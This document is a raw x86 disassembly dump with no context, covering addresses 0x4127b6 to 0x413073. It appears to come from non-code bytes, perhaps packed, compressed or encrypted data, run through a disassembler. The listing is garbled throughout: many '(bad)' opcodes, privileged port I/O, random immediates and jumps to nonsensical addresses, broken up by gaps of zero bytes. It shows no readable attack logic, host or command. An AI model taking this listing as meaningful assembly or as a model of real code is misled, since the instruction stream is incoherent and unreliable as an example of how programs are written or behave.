  4127b6:	pop    esi
  4127b7:	aaa    
  4127b8:	pop    esi
  4127b9:	aam    0x98
  4127bb:	cmp    BYTE PTR [edx],bl
  4127bd:	mov    eax,ds:0x5be1354e
  4127c2:	out    dx,al
  4127c3:	scas   al,BYTE PTR es:[edi]
  4127c4:	iret   
  4127c5:	loopne 0x4127cf
  4127c7:	ret    
  4127c8:	xor    al,0x54
  4127ca:	or     BYTE PTR [edx+edi*1-0x63],bl
  4127ce:	pop    eax
  4127cf:	mov    esi,0x1e1828b4
  4127d4:	cmp    cl,BYTE PTR [ebp-0x5e0fa220]
  4127da:	cmc    
  4127db:	loop   0x4127dd
	...
  4127ed:	add    BYTE PTR [eax],al
  4127ef:	add    BYTE PTR [edi+0x25],cl
  4127f2:	cmp    BYTE PTR [ecx-0x6e0fa7fa],bl
  4127f8:	nop
  4127f9:	xchg   esp,eax
  4127fa:	in     eax,0x37
  4127fc:	test   BYTE PTR [eax],ch
  4127fe:	add    BYTE PTR [ecx],al
  412800:	mov    bh,0x77
  412802:	cmc    
  412803:	out    0xc3,al
  412805:	mov    eax,ds:0x477f17b
  41280a:	sub    al,0xd6
  41280c:	pop    ebx
  41280d:	mov    ds:0x2863cd7b,al
  412812:	lock (bad) 
  412814:	fstp   QWORD PTR [eax-0x6092e920]
  41281a:	cmc    
  41281b:	shl    DWORD PTR [edi],0x78
  41281e:	cmc    
  41281f:	scas   al,BYTE PTR es:[edi]
  412820:	bswap  ebx
  412822:	pop    es
  412823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412824:	jg     0x412806
  412826:	scas   eax,DWORD PTR es:[edi]
  412827:	sahf   
  412828:	mov    ds:0xea9bf59e,eax
  41282d:	addr16 or eax,0xb2def214
  412833:	push   ss
  412834:	dec    ecx
  412835:	mov    al,ds:0x4f842484
  41283a:	pop    ebp
  41283b:	jbe    0x41283a
  41283d:	(bad)  
  41283e:	cmc    
  41283f:	hlt    
  412840:	xchg   ebx,eax
  412841:	lods   al,BYTE PTR ds:[esi]
  412842:	push   ebx
  412843:	adc    bh,BYTE PTR [ebx-0x62]
  412846:	add    DWORD PTR [ecx],ebp
  412848:	fdivr  QWORD PTR ds:0x12586258
  41284e:	je     0x41289d
  412850:	xchg   ecx,eax
  412851:	es inc esp
	...
  412867:	add    BYTE PTR [ebp-0x108af75a],ah
  41286d:	loope  0x412865
  41286f:	dec    ebp
  412870:	mov    ecx,0xba0008f0
  412875:	div    BYTE PTR es:[ebp-0x57]
  412879:	into   
  41287a:	pop    esi
  41287b:	inc    DWORD PTR [eax]
  41287d:	mov    eax,fs
  41287f:	(bad)  
  412880:	jnp    0x4128e9
  412882:	test   BYTE PTR [ebx],0x9d
  412885:	imul   esp,DWORD PTR [eax+eax*4],0xffffffcb
  412889:	xchg   ebp,eax
  41288a:	jnp    0x4128b4
  41288c:	repz inc sp
  41288f:	cld    
  412890:	sete   BYTE PTR [ebx+0x5bc3a945]
  412897:	call   0x37f0c0
  41289c:	sahf   
  41289d:	push   ebx
  41289e:	jns    0x4128b4
  4128a0:	dec    ebp
  4128a1:	xchg   edx,eax
  4128a2:	or     bh,ch
  4128a4:	or     esp,DWORD PTR [edi+0x7c]
  4128a7:	cld    
  4128a8:	jae    0x412879
  4128aa:	div    BYTE PTR [ebp+0x7d]
  4128ad:	imul   ebp,DWORD PTR [esi+0x2663afe],0xffffffd8
  4128b4:	dec    ebp
  4128b5:	jle    0x4128e5
  4128b7:	jmp    FWORD PTR [edx]
  4128b9:	addr16 cmp al,al
  4128bc:	in     al,dx
  4128bd:	data16 idiv bh
  4128c0:	cli    
  4128c1:	mov    fs:0x89e47238,eax
  4128c7:	mov    edi,0x48f79e
	...
  4128e0:	mov    eax,0xa250f1d4
  4128e5:	addr16 jl 0x4128f8
  4128e8:	stos   BYTE PTR es:[edi],al
  4128e9:	in     al,0x1
  4128eb:	call   0x37d6b9
  4128f0:	push   ds
  4128f1:	push   ebx
  4128f2:	jns    0x412924
  4128f4:	mov    ebp,ds
  4128f6:	test   BYTE PTR [esp+edx*1-0x2b],al
  4128fa:	cmc    
  4128fb:	jmp    DWORD PTR [edx]
  4128fd:	pop    ss
  4128fe:	aas    
  4128ff:	je     0x412895
  412901:	inc    ebp
  412902:	test   eax,0xc6660323
  412907:	inc    BYTE PTR [ecx-0x5747de4b]
  41290d:	jbe    0x41294d
  41290f:	(bad)  
  412910:	popa   
  412911:	cmp    DWORD PTR [esi],0xb885e474
  412917:	pop    es
  412918:	in     al,0xd
  41291a:	(bad)  
  41291b:	(bad)  
  41291c:	rol    DWORD PTR [edx+ebx*4-0x786234da],cl
  412923:	retf   0xa98d
  412926:	idiv   DWORD PTR [edi-0x1c4520b]
  41292c:	mov    bl,0xba
  41292e:	outs   dx,BYTE PTR ds:[esi]
  41292f:	aaa    
  412930:	xchg   ebx,eax
  412931:	dec    eax
  412932:	outs   dx,BYTE PTR ds:[esi]
  412933:	or     al,bh
  412935:	inc    eax
  412936:	or     eax,0x2cad7c68
  41293b:	mov    ebp,0xe8045f93
  412940:	scas   al,BYTE PTR es:[edi]
  412941:	xchg   edi,eax
  412942:	cmp    edi,esi
	...
  412958:	pop    ss
  412959:	jmp    0x41292a
  41295b:	pop    ebp
  41295c:	fcomi  st,st(4)
  41295e:	dec    edx
  41295f:	jl     0xe2ca8c5
  412965:	clc    
  412966:	cmp    al,0xf6
  412968:	arpl   WORD PTR [edi],ax
  41296a:	mov    es,WORD PTR [eax+ebx*2+0x5c]
  41296e:	cmp    esi,DWORD PTR [esp+edi*2+0x16]
  412972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412973:	or     esi,DWORD PTR [edx+ebp*1]
  412976:	pop    ss
  412977:	add    BYTE PTR [edx+esi*4-0x9448bb7],cl
  41297e:	mov    ch,0xf7
  412980:	mov    WORD PTR [edi+ebx*8-0x532a73fd],ss
  412987:	das    
  412988:	and    dl,BYTE PTR [esi-0x6b59fc21]
  41298e:	leave  
  41298f:	add    esp,DWORD PTR [esi+0x1903d994]
  412995:	pop    eax
  412996:	cmp    edx,esp
  412998:	adc    BYTE PTR [eax],bl
  41299a:	xor    al,0x2d
  41299c:	cli    
  41299d:	popf   
  41299e:	(bad)  
  41299f:	xor    al,0x78
  4129a1:	pushf  
  4129a2:	cs scas eax,DWORD PTR es:[edi]
  4129a4:	out    0xac,eax
  4129a6:	(bad)  
  4129a7:	adc    BYTE PTR [esp+edx*4-0x6da0bc16],cl
  4129ae:	or     bh,BYTE PTR [edi-0x3d481795]
  4129b4:	retf   
  4129b5:	sahf   
  4129b6:	jl     0x4129cb
  4129b8:	mov    ah,0xf0
  4129ba:	leave  
  4129bb:	xor    al,0x0
	...
  4129cd:	add    BYTE PTR [eax],al
  4129cf:	add    BYTE PTR [edx+0x8871009],bh
  4129d5:	test   eax,0x44aa34d6
  4129da:	xor    DWORD PTR [esp+ebx*4],ebp
  4129dd:	push   0xffffffde
  4129df:	xor    al,0x4
  4129e1:	sbb    al,dl
  4129e3:	sub    al,0x92
  4129e5:	popf   
  4129e6:	pop    ecx
  4129e7:	add    al,0x8b
  4129e9:	out    0xaf,eax
  4129eb:	sub    al,0x82
  4129ed:	popf   
  4129ee:	mov    esi,0x3c9d87ae
  4129f3:	or     al,0x64
  4129f5:	lods   al,BYTE PTR ds:[esi]
  4129f6:	lods   al,BYTE PTR ds:[esi]
  4129f7:	xor    al,0x6a
  4129f9:	popf   
  4129fa:	pop    esp
  4129fb:	xor    ebx,DWORD PTR [edx-0x63]
  4129fe:	sahf   
  4129ff:	sub    esi,DWORD PTR ds:0x52348676
  412a05:	push   edi
  412a06:	xchg   DWORD PTR [eax],ebp
  412a08:	sbb    ebx,DWORD PTR [ebp-0x64d4c804]
  412a0e:	or     bl,bl
  412a10:	(bad)  
  412a11:	xchg   esp,eax
  412a12:	mov    edi,0x5b948bab
  412a17:	jb     0x412a8c
  412a19:	adc    al,0xcd
  412a1b:	pop    ecx
  412a1c:	jo     0x4129bc
  412a1e:	cmc    
  412a1f:	ficomp DWORD PTR fs:[eax-0x731db1a8]
  412a26:	cmc    
  412a27:	mov    esp,0xdbe9ac93
  412a2c:	(bad)  
  412a2d:	xchg   esp,eax
  412a2e:	add    DWORD PTR [ecx],ebp
  412a30:	nop
  412a31:	pop    ss
  412a32:	(bad)
	...
  412a46:	add    BYTE PTR [eax],al
  412a48:	(bad)  
  412a49:	xchg   esp,eax
  412a4a:	int    0xac
  412a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a4d:	popf   
  412a4e:	cmc    
  412a4f:	jmp    0x1d8cffe3
  412a54:	mov    al,ds:0x25e90896
  412a59:	popf   
  412a5a:	pop    edi
  412a5b:	jmp    0xe9a0c755
  412a60:	or     bl,BYTE PTR [eax-0x4]
  412a63:	cdq    
  412a64:	adc    bl,BYTE PTR [eax]
  412a66:	std    
  412a67:	idiv   BYTE PTR [edi-0x62]
  412a6a:	pop    eax
  412a6b:	out    0xe5,al
  412a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a6e:	cmc    
  412a6f:	push   esp
  412a70:	pop    esp
  412a71:	mov    ch,0xbb
  412a73:	sti    
  412a74:	(bad)  
  412a75:	xchg   esp,eax
  412a76:	add    DWORD PTR [ecx+0x35e192d4],ebp
  412a7c:	sub    al,ch
  412a7e:	inc    eax
  412a7f:	sub    BYTE PTR [eax-0x68268465],cl
  412a85:	mov    WORD PTR [edx],fs
  412a87:	scas   al,BYTE PTR es:[edi]
  412a88:	mov    edi,0x1574d90e
  412a8d:	test   al,0xfd
  412a8f:	sahf   
  412a90:	lahf   
  412a91:	dec    ebx
  412a92:	pop    edx
  412a93:	or     DWORD PTR [esi+0x6e],0x209f8ef5
  412a9a:	sbb    al,0x0
  412a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a9d:	js     0x412aeb
  412a9f:	sub    al,dl
  412aa1:	add    BYTE PTR [di+0x5fb5],0xf6
  412aa7:	jmp    DWORD PTR [edx+0xf7e51d]
	...
  412abd:	add    BYTE PTR [eax],al
  412abf:	add    BYTE PTR [edx+0x3175f667],dh
  412ac5:	addr16 jl 0x412ad0
  412ac8:	int    0x43
  412aca:	repz inc edx
  412acd:	addr16 mov esp,0xf667caf0
  412ad3:	call   0x37d8dd
  412ad8:	ret    0xfdcd
  412adb:	jmp    0x412b49
  412add:	addr16 jl 0x412adc
  412ae0:	jge    0x412ab9
  412ae2:	pop    ss
  412ae3:	add    ch,dh
  412ae5:	pop    eax
  412ae6:	(bad)  
  412ae7:	adc    ch,ah
  412ae9:	mov    esp,0x4c66ec82
  412aee:	cdq    
  412aef:	push   edi
  412af0:	xchg   edx,eax
  412af1:	fld    QWORD PTR [ecx]
  412af3:	call   0x37c90c
  412af8:	scas   al,BYTE PTR es:[edi]
  412af9:	push   edi
  412afa:	jl     0x412b01
  412afc:	add    bl,BYTE PTR [ecx-0x39]
  412aff:	sbb    al,0xb5
  412b01:	sbb    BYTE PTR [esp+edx*4+0x1e],cl
  412b05:	in     al,0x11
  412b07:	psubq  mm1,mm6
  412b0a:	push   es
  412b0b:	push   eax
  412b0c:	mov    dl,0x1d
  412b0e:	dec    esi
  412b0f:	push   cs
  412b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b11:	xchg   edi,eax
  412b12:	mov    esi,0x6c77047
  412b17:	mov    dh,0xaa
  412b19:	xchg   esp,eax
  412b1a:	pop    eax
  412b1b:	psubq  mm1,mm6
  412b1e:	add    dl,BYTE PTR [eax+0x62]
  412b21:	sbb    eax,0xa4e
	...
  412b36:	add    BYTE PTR [eax],al
  412b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b39:	xchg   edi,eax
  412b3a:	mov    esi,0xd9b48c47
  412b3f:	push   cs
  412b40:	sbb    dh,BYTE PTR [edx-0xc]
  412b43:	dec    edi
  412b44:	fwait
  412b45:	pop    edx
  412b46:	ret    0xdc05
  412b49:	stos   BYTE PTR es:[edi],al
  412b4a:	jb     0x412b92
  412b4c:	nop
  412b4d:	jge    0x412b88
  412b4f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  412b51:	sbb    eax,0x208c40bc
  412b56:	rcr    BYTE PTR [ebx+0x104445bc],0x8c
  412b5d:	lods   eax,DWORD PTR ds:[esi]
  412b5e:	mov    es,ebx
  412b60:	pop    eax
  412b61:	cs mov eax,0xb4d98c1f
  412b67:	(bad)  
  412b68:	jns    0x412b2b
  412b6a:	cmp    dh,BYTE PTR [esp+ebx*4+0x55]
  412b6e:	or     BYTE PTR [esi],dh
  412b70:	repz imul esi,esi,0x750760bf
  412b77:	inc    esp
  412b78:	add    al,0x7a
  412b7a:	mov    al,0x7
  412b7c:	fcomi  st,st(7)
  412b7e:	add    eax,ebp
  412b80:	inc    esi
  412b81:	iret   
  412b82:	cmp    bh,dh
  412b84:	retf   
  412b85:	pop    ss
  412b86:	popf   
  412b87:	(bad)  
  412b88:	cmp    DWORD PTR [ebp-0x5d915fef],esi
  412b8e:	aaa    
  412b8f:	mov    WORD PTR [ecx+0x49],cs
  412b92:	fsin   
  412b94:	and    DWORD PTR [ebp-0x45916bec],edx
  412b9a:	aaa    
  412b9b:	inc    BYTE PTR [eax]
	...
  412bad:	add    BYTE PTR [eax],al
  412baf:	add    BYTE PTR [ecx],ah
  412bb1:	and    eax,0xd5747437
  412bb6:	jbe    0x412bd9
  412bb8:	mov    edx,ebx
  412bba:	aaa    
  412bbb:	je     0x412be1
  412bbd:	les    esp,FWORD PTR [edi+0x13e37b24]
  412bc3:	das    
  412bc4:	jae    0x412c27
  412bc6:	hlt    
  412bc7:	(bad)  
  412bc8:	loope  0x412b5e
  412bca:	pop    es
  412bcb:	sbb    al,0x7e
  412bcd:	jbe    0x412b65
  412bcf:	xor    DWORD PTR [edx+0x20],ebx
  412bd2:	jae    0x412c05
  412bd4:	fdivr  DWORD PTR [edi+eax*4-0x62]
  412bd8:	ins    DWORD PTR es:[edi],dx
  412bd9:	cdq    
  412bda:	mov    ?,WORD PTR [edi-0x38]
  412bdd:	clc    
  412bde:	rdtsc  
  412be0:	sar    BYTE PTR [edi+eax*4-0x2e],0x6d
  412be5:	cdq    
  412be6:	xor    WORD PTR [eax-0x6c489180],sp
  412bed:	cdq    
  412bee:	fmul   QWORD PTR [ebx]
  412bf0:	and    al,0x71
  412bf2:	add    DWORD PTR [ecx],esi
  412bf4:	adc    bl,BYTE PTR [edx+0x5ff397dc]
  412bfa:	add    al,0x31
  412bfc:	add    bh,BYTE PTR [edx]
  412bfe:	cmp    BYTE PTR [esi-0x69],al
  412c01:	xchg   esp,eax
  412c02:	xchg   esp,eax
  412c03:	jl     0x412bec
  412c05:	adc    ebp,DWORD PTR [eax+ebp*1]
  412c08:	ficomp WORD PTR [ecx+0x7c58312e]
  412c0e:	fs xchg ebx,ebx
  412c11:	popf   
  412c12:	push   ds
  412c13:	xor    DWORD PTR [eax],eax
	...
  412c25:	add    BYTE PTR [eax],al
  412c27:	add    BYTE PTR [ebx-0x67],al
  412c2a:	pushf  
  412c2b:	sti    
  412c2c:	mov    bl,0x3c
  412c2e:	pop    esp
  412c2f:	xor    edx,eax
  412c31:	cdq    
  412c32:	jl     0x412c3f
  412c34:	or     DWORD PTR [eax],edx
  412c36:	loopne 0x412c63
  412c38:	mov    dl,0x99
  412c3a:	(bad)  
  412c3b:	xor    BYTE PTR [eax],ah
  412c3d:	mov    dh,ch
  412c3f:	mov    dh,0x8b
  412c41:	lods   al,BYTE PTR ds:[esi]
  412c42:	gs pop esi
  412c44:	call   0x4794:0x26044999
  412c4b:	xor    DWORD PTR [esi+0x87edf94],ecx
  412c51:	xchg   esp,eax
  412c52:	mov    ebx,0x8447a30
  412c57:	inc    ebx
  412c58:	mov    ebp,0x9d97b9a
  412c5d:	cdq    
  412c5e:	pop    edi
  412c5f:	jmp    0xe95997eb
  412c64:	(bad)  
  412c65:	ror    DWORD PTR [ebx-0xa656767],1
  412c6b:	stc    
  412c6c:	(bad)  
  412c6d:	xchg   esp,eax
  412c6e:	or     BYTE PTR [esi+0x7ef9a50a],ch
  412c74:	jl     0x412c09
  412c76:	or     cl,ch
  412c78:	(bad)  
  412c79:	ror    DWORD PTR [ebx-0xa659f8f],1
  412c7f:	jmp    0x2649c113
  412c84:	adc    bl,BYTE PTR [ebp-0x66a3a907]
  412c8a:	cmc    
  412c8b:	jmp    0x412c90
	...
  412ca0:	(bad)  
  412ca1:	or     eax,0x8380e15c
  412ca6:	(bad)  
  412ca7:	jmp    0x3b3a3d26
  412cac:	mov    esp,0x125c589a
  412cb1:	lods   eax,DWORD PTR ds:[esi]
  412cb2:	stc    
  412cb3:	es pushf 
  412cb5:	dec    ecx
  412cb6:	and    DWORD PTR [edi+esi*2-0x5a],0xfffffff5
  412cbb:	push   ss
  412cbc:	mov    edi,0x7cf97b99
  412cc1:	and    BYTE PTR [esi+eax*1],al
  412cc4:	cli    
  412cc5:	nop
  412cc6:	(bad)  
  412cc7:	jmp    0xf6514d48
  412ccc:	fcom   DWORD PTR [ecx+ecx*4+0x2c]
  412cd0:	xchg   DWORD PTR [esi-0x7677190b],esp
  412cd6:	mov    esp,ss
  412cd8:	nop
  412cd9:	xchg   esp,eax
  412cda:	or     BYTE PTR [edx+0x1d],ch
  412cdd:	lods   eax,DWORD PTR ds:[esi]
  412cde:	stc    
  412cdf:	into   
  412ce0:	mov    ebx,0xf1000697
  412ce5:	js     0x412cdc
  412ce7:	jmp    DWORD PTR [ebp-0x4]
  412cea:	xor    DWORD PTR [ecx-0x5c],0xffffff90
  412cee:	add    DWORD PTR [ebp-0x9978b],0xffffffa5
  412cf5:	js     0x412cc6
  412cf7:	pcmpgtw mm2,QWORD PTR [ebx+ecx*4+0x608971c0]
  412cff:	popf   
  412d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d01:	shl    ebp,1
  412d03:	mov    WORD PTR [eax],es
	...
  412d15:	add    BYTE PTR [eax],al
  412d17:	add    BYTE PTR [eax-0x45000b70],dh
  412d1d:	shr    ch,0xc5
  412d20:	sub    dl,BYTE PTR [eax+ecx*1-0x73680a7b]
  412d27:	scas   eax,DWORD PTR es:[edi]
  412d28:	xor    eax,0xb0c70894
  412d2d:	ins    BYTE PTR es:[edi],dx
  412d2e:	cli    
  412d2f:	(bad)  
  412d30:	mov    edx,0x1bef088d
  412d35:	stc    
  412d36:	mov    al,ds:0x83943471
  412d3b:	test   ebp,esp
  412d3d:	imul   esi,esi,0xffffffff
  412d40:	adc    eax,0xf50fa77c
  412d45:	xchg   ebx,eax
  412d46:	mov    eax,eax
  412d48:	add    DWORD PTR [edx+0x639185ce],ebp
  412d4e:	idiv   bh
  412d50:	jecxz  0x412ce5
  412d52:	in     eax,0xbe
  412d54:	or     eax,0xb5417853
  412d59:	adc    al,0x8d
  412d5b:	add    BYTE PTR [ebp-0x72af0999],cl
  412d61:	adc    eax,DWORD PTR [edi]
  412d63:	add    BYTE PTR [ebp-0x758b49f4],dh
  412d69:	dec    edi
  412d6a:	mov    esp,fs
  412d6c:	mov    dh,0x66
  412d6e:	test   BYTE PTR [edi],0x8c
  412d71:	lods   eax,DWORD PTR ds:[esi]
  412d72:	push   ss
  412d73:	mov    ebp,0x40bcd0f4
  412d78:	mov    WORD PTR [eax],fs
  412d7a:	cmp    bh,0x0
	...
  412d8d:	add    BYTE PTR [eax],al
  412d8f:	add    BYTE PTR [ebx+0x644f26d6],al
  412d95:	dec    ecx
  412d96:	cmc    
  412d97:	jmp    FWORD PTR [ebx+0x30]
  412d9a:	dec    ecx
  412d9b:	je     0x412d5b
  412d9d:	sub    al,0x78
  412d9f:	jecxz  0x412e00
  412da1:	mul    BYTE PTR [esi]
  412da3:	push   es
  412da4:	mov    WORD PTR [esi],cs
  412da6:	fs je  0x412e19
  412da9:	xchg   ebx,eax
  412daa:	or     al,0xff
  412dac:	mov    ecx,0xa07426a1
  412db1:	push   ss
  412db2:	jo     0x412d9b
  412db4:	aas    
  412db5:	push   ds
  412db6:	es (bad) 
  412db8:	loope  0x412dd2
  412dba:	cmp    bh,dh
  412dbc:	and    ebp,DWORD PTR [esi]
  412dbe:	mov    al,0xf
  412dc0:	sbb    eax,DWORD PTR [eax]
  412dc2:	repnz adc edi,DWORD PTR cs:[esi]
  412dc6:	adc    DWORD PTR [edx-0x15d9b9f7],ebx
  412dcc:	scas   al,BYTE PTR es:[edi]
  412dcd:	ret    
  412dce:	or     al,0xff
  412dd0:	sub    DWORD PTR [ecx+0x5e987426],0x65dfe770
  412dda:	es (bad) 
  412ddc:	sbb    DWORD PTR [ecx+0x75dbfe3a],eax
  412de2:	mov    al,0xf
  412de4:	shl    DWORD PTR [edi],cl
  412de6:	sub    eax,0x1185cbf2
  412deb:	jbe    0x412dae
  412ded:	lea    esp,[esi]
  412def:	inc    BYTE PTR [ecx]
  412df1:	mov    DWORD PTR [edx],edi
  412df3:	inc    BYTE PTR [eax]
	...
  412e05:	add    BYTE PTR [eax],al
  412e07:	add    BYTE PTR [ebx-0x73f1656c],dh
  412e0d:	lods   eax,DWORD PTR ds:[esi]
  412e0e:	xor    al,0xc1
  412e10:	js     0x412da6
  412e12:	(bad)  
  412e14:	push   es
  412e15:	test   al,0x62
  412e17:	dec    eax
  412e18:	xchg   edi,eax
  412e19:	adc    bl,BYTE PTR ds:0xdf53d63a
  412e1f:	add    edi,eax
  412e21:	push   ebp
  412e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e23:	(bad)  
  412e24:	ja     0x412dbb
  412e26:	fild   WORD PTR [ebx]
  412e28:	mov    WORD PTR [ecx-0x61],gs
  412e2b:	aam    0xdb
  412e2d:	inc    esp
  412e2e:	push   esp
  412e2f:	xlat   BYTE PTR ds:[ebx]
  412e30:	addr16 inc ebx
  412e32:	scas   al,BYTE PTR es:[edi]
  412e33:	pop    ss
  412e34:	inc    esi
  412e35:	dec    edx
  412e36:	and    BYTE PTR [ecx+ecx*1],al
  412e39:	aad    0x18
  412e3b:	add    dh,BYTE PTR [edi]
  412e3d:	jb     0x412ea1
  412e3f:	scas   eax,DWORD PTR es:[edi]
  412e40:	inc    edi
  412e41:	xchg   ebp,eax
  412e42:	hlt    
  412e43:	add    DWORD PTR [edi],esp
  412e45:	jp     0x412e5e
  412e47:	mov    ah,0x3e
  412e49:	push   ebp
  412e4a:	fild   QWORD PTR [eax+eiz*4]
  412e4d:	cwde   
  412e4e:	data16 mov bh,0x8b
  412e51:	lods   al,BYTE PTR ds:[esi]
  412e52:	sub    ebx,DWORD PTR [edi+0x1a]
  412e55:	xchg   esi,eax
  412e56:	jp     0x412e2f
  412e58:	pop    ss
  412e59:	or     dh,dl
  412e5b:	sub    al,0x80
  412e5d:	cwde   
  412e5e:	inc    esi
  412e5f:	ror    BYTE PTR [ebx-0x73f7de35],cl
  412e65:	aas    
  412e66:	jp     0x412e88
  412e68:	push   cs
  412e69:	sar    DWORD PTR [ebx],1
  412e6b:	call   0x0:0x0
	...
  412e7e:	add    BYTE PTR [eax],al
  412e80:	jmp    0x412ead
  412e82:	test   DWORD PTR [eax+ebx*2],ebp
  412e85:	mov    WORD PTR [edi],ss
  412e87:	leave  
  412e88:	jnp    0x412e1f
  412e8a:	push   ss
  412e8b:	jnp    0x412ed5
  412e8d:	cwde   
  412e8e:	push   ds
  412e8f:	mov    bh,0x93
  412e91:	lods   al,BYTE PTR ds:[esi]
  412e92:	jo     0x412ec1
  412e94:	ret    0x9795
  412e97:	add    bh,BYTE PTR [ebx+edx*2]
  412e9a:	fild   QWORD PTR [eax+edi*2]
  412e9d:	mov    esp,0x95cea108
  412ea2:	div    BYTE PTR [edi+eiz*4-0x53]
  412ea6:	xchg   ebx,eax
  412ea7:	loop   0x412f11
  412ea9:	xchg   esi,eax
  412eaa:	pusha  
  412eab:	call   0x4149838f
  412eb0:	add    al,0x4e
  412eb2:	inc    edi
  412eb3:	jmp    0xc6702f5f
  412eb8:	test   al,0x45
  412eba:	pop    eax
  412ebb:	push   ecx
  412ebc:	jp     0x412ee3
  412ebe:	inc    edi
  412ebf:	jmp    0x22118f7c
  412ec4:	dec    edi
  412ec5:	xchg   ebp,eax
  412ec6:	neg    BYTE PTR [eax+ebx*2]
  412ec9:	lods   eax,DWORD PTR ds:[esi]
  412eca:	adc    BYTE PTR [ebp-0x4a1f6960],bl
  412ed0:	sub    eax,0x8803f596
  412ed5:	sub    al,0x74
  412ed7:	clc    
  412ed8:	dec    esi
  412ed9:	xchg   ebp,eax
  412eda:	ins    DWORD PTR es:[edi],dx
  412edb:	sbb    edi,edi
  412edd:	push   ebx
  412ede:	or     BYTE PTR [ecx],al
  412ee0:	mov    ss,WORD PTR [eax+ecx*1+0x69]
	...
  412ef7:	add    BYTE PTR [edi+0x68662bb7],al
  412efd:	mov    cl,al
  412eff:	aad    0x2f
  412f01:	sub    eax,0x94ced88c
  412f06:	inc    ebp
  412f07:	inc    ecx
  412f08:	outs   dx,DWORD PTR gs:[esi]
  412f0a:	cmc    
  412f0b:	inc    esi
  412f0c:	fild   WORD PTR [ebp+esi*8-0xc]
  412f10:	inc    edi
  412f11:	dec    ebp
  412f12:	inc    edi
  412f13:	jmp    0x41414fd0
  412f18:	lock cdq 
  412f1a:	cmc    
  412f1b:	es ja  0x412f11
  412f1e:	sub    bl,BYTE PTR [esi]
  412f20:	mov    al,ds:0xce99472d
  412f25:	xchg   esp,eax
  412f26:	not    ah
  412f28:	push   edi
  412f29:	dec    ebp
  412f2a:	inc    edi
  412f2b:	add    BYTE PTR [ebp-0x62f78399],ah
  412f31:	mov    al,0xf2
  412f33:	jmp    DWORD PTR [edx+0x3567f5fb]
  412f39:	loope  0x412f83
  412f3b:	add    BYTE PTR [edx+0x6448dda2],dh
  412f41:	nop
  412f42:	cmc    
  412f43:	jne    0x412fb2
  412f45:	mov    al,0xb8
  412f47:	sti    
  412f48:	push   edx
  412f49:	rcr    BYTE PTR [edi+0x0],0xdd
  412f4d:	(bad)  
  412f4e:	gs inc ecx
  412f50:	gs mov edi,0x59add83c
  412f56:	cmc    
  412f57:	(bad)  
  412f58:	cwde   
  412f59:	nop
  412f5a:	in     eax,dx
  412f5b:	pushf  
	...
  412f70:	cs shl dh,0xff
  412f74:	js     0x412f32
  412f76:	div    BYTE PTR [ebp+0x2d]
  412f79:	mov    al,0xdd
  412f7b:	pop    ds
  412f7c:	adc    al,al
  412f7e:	rol    dl,0x29
  412f81:	cwde   
  412f82:	pop    ebx
  412f83:	mov    eax,DWORD PTR [ecx]
  412f85:	sbb    cl,cl
  412f87:	hlt    
  412f88:	mov    ds:0x356af6bf,eax
  412f8d:	xor    dl,BYTE PTR [esi-0x1]
  412f90:	cmp    BYTE PTR [eax-0x40ed8613],dl
  412f96:	test   BYTE PTR [ecx+0x5cebc38],0x72
  412f9d:	cmp    BYTE PTR [eax+0x0],cl
  412fa0:	out    0x97,eax
  412fa2:	or     BYTE PTR [eax],al
  412fa4:	pusha  
  412fa5:	adc    eax,0xbfa2fefe
  412faa:	inc    ebp
  412fab:	push   0x898e9
  412fb0:	jge    0x412f6d
  412fb2:	add    al,0x0
  412fb4:	in     eax,0x2f
  412fb6:	es jb  0x412f45
  412fb9:	cmp    al,0x9
  412fbb:	push   0xffcc2f6f
  412fc0:	xor    edi,ebp
  412fc2:	stos   DWORD PTR es:[edi],eax
  412fc3:	inc    eax
  412fc4:	mov    WORD PTR [edx+0x3c54d7f8],ss
  412fca:	or     edi,edi
  412fcc:	sbb    DWORD PTR [ebp+0x11],esi
  412fcf:	fucomi st,st(7)
  412fd1:	jp     0x412ff5
  412fd3:	add    BYTE PTR [bx+si],al
	...
  412fe6:	add    BYTE PTR [eax],al
  412fe8:	arpl   di,bp
  412fea:	retf   
  412feb:	push   ebx
  412fed:	sahf   
  412fee:	mov    esi,0x8cd58c40
  412ff3:	pusha  
  412ff4:	int    0x7d
  412ff6:	xchg   ecx,eax
  412ff7:	add    DWORD PTR [ebp+edi*2+0x75e1fe89],ecx
  412ffe:	adc    DWORD PTR [edi-0x73ddbdd1],edi
  413004:	adc    DWORD PTR [edx],esi
  413006:	pop    ds
  413007:	(bad)  
  413008:	push   ebx
  413009:	int    0x14
  41300b:	mov    ebx,DWORD PTR [ecx-0x7638f683]
  413011:	add    ch,BYTE PTR [edx+0x97e8c40]
  413017:	add    BYTE PTR [eax+eax*1+0xa2af689],cl
  41301e:	and    ecx,DWORD PTR [edi-0x4c]
  413021:	jns    0x41302f
  413023:	add    BYTE PTR [ebp+eiz*8+0x7d8c0c8e],cl
  41302a:	xchg   ecx,eax
  41302b:	cs jle 0x41306a
  41302e:	or     DWORD PTR [eax-0x51],ebp
  413031:	outs   dx,DWORD PTR ds:[esi]
  413032:	int3   
  413033:	push   DWORD PTR [ebx-0x3]
  413036:	lods   al,BYTE PTR ds:[esi]
  413037:	inc    eax
  413038:	mov    edx,ss
  41303a:	clc    
  41303b:	xlat   BYTE PTR ds:[ebx]
  41303c:	push   esp
  41303d:	cmp    al,0x9
  41303f:	call   FWORD PTR [ecx+0x75]
  413042:	adc    DWORD PTR [ebx+0x2f],edi
  413045:	xchg   esp,eax
  413046:	sub    ch,BYTE PTR cs:[ebx-0x3d]
  41304a:	xchg   ecx,eax
  41304b:	les    eax,FWORD PTR [eax]
	...
  41305d:	add    BYTE PTR [eax],al
  41305f:	add    bl,cl
  413061:	cli    
  413062:	ret    0x4cb5
  413065:	xchg   esp,eax
  413066:	xchg   DWORD PTR [ebx-0x64202ad4],eax
  41306c:	lea    edx,[edi+ebx*8-0x17f7557d]
  413073:	sbb    eax,DWORD PTR [ebx+0x37]
